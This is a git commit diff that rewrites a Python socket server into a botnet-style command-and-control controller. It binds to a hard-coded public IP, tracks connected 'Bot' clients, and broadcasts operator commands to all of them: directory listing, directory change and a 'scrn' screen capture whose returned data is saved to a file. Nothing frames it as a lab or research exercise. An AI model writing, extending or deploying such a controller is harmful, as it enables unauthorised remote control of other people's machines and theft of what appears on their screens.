5db95d8cafe3d486bd06496a66d0eeb3a79ec838
Maxi <maxioffe@gmail.com>
2017-12-03 19:30:47 -0500

    Test?

--- controller.py
+++ controller.py
@@ -2,26 +2,77 @@ import socket
 from threading import *
 
 serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = ""
+host = "45.55.59.112"
 port = 8000
-print (host)
-print (port)
+print host
+print port
 serversocket.bind((host, port))
+serversocket.listen(5)
+print 'server started and listening'
+lock = Lock()
 
-class client(Thread):
+
+class Bot(Thread):
     def __init__(self, socket, address):
-        Thread.__init__(self)
+	Thread.__init__(self)
+	self.daemon = True
         self.sock = socket
         self.addr = address
-        self.start()
+	self.last_message = ''
+	self.received = False
+	self.start()
+
+    def execute_command(self, cmd):
+        self.received = False
+	self.last_message = ''
+	self.sock.send(cmd)
+	if cmd == 'scrn':
+	    screen_cap = open('cap', 'w')
+	    while not self.received:
+		pass
+	    screen_cap.write(self.last_message)
+	
 
     def run(self):
-        while 1:
-            print('Client sent:', self.sock.recv(1024).decode())
-            self.sock.send(b'Oi you sent something to me')
+	message = ''
+	while True:
+	    while 'EOF' not in message:
+                message += self.sock.recv(4096)
+            message = message[:-3]
+	    if len(message) < 100:
+	    	print 'Client', self.addr, ':\n', message
+	    self.last_message = message
+	    self.received = True
+	
 
-serversocket.listen(5)
-print ('server started and listening')
-while 1:
-    clientsocket, address = serversocket.accept()
-    client(clientsocket, address)
+
+class Controller(Thread):
+    def __init__(self):
+        Thread.__init__(self)
+	self.daemon = True
+	self.bots= []
+ 	self.start()
+
+    def run(self):
+	while True:
+	    clientsocket, address = serversocket.accept()
+	    self.bots.append(Bot(clientsocket, address))
+	    
+	    
+
+controller = Controller()
+while True:
+    cmd = ''
+    raw_input()  # press enter
+    with lock:
+        cmd = raw_input("control$ ")
+    
+    valid_cmd = False
+    if (cmd == 'ls' or cmd.split(' ')[0] == 'cd' or cmd == 'pwd' or
+       cmd == 'scrn'):
+	valid_cmd = True
+	
+    if valid_cmd:
+        for bot in controller.bots:
+            bot.execute_command(cmd)
+	
